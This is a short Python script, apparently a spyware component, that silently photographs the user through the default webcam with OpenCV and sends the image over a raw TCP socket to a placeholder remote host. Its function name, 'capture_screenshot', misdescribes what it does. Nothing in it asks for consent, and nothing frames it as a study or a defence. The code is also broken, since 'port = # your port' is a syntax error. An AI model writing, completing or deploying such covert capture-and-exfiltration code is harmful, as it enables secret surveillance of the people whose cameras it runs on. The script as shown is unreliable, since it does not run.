import cv2
import socket

def capture_screenshot():
    host = "enter ip"
    port = # your port

    capture = cv2.VideoCapture(0) # default camera
    # check if webcam opens successfully
    if not capture.isOpened():
        return # if it doesn't
    ret, frame = capture.read() # two arguments, ret is a bool to indicate if it was successful or not and frame is the captured frame
    if not ret:
        # if it wasn't successfully captured, then something went wrong
        return
    cv2.imwrite("cam.png", frame) # save the captured frame as a screenshot
    capture.release()
    cv2.destroyAllWindows()

    with open("cam.png", "rb") as image_file:
        screenshot_data = image_file.read()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        client_socket.sendall(screenshot_data)

if __name__ == "__main__":
    capture_screenshot()
    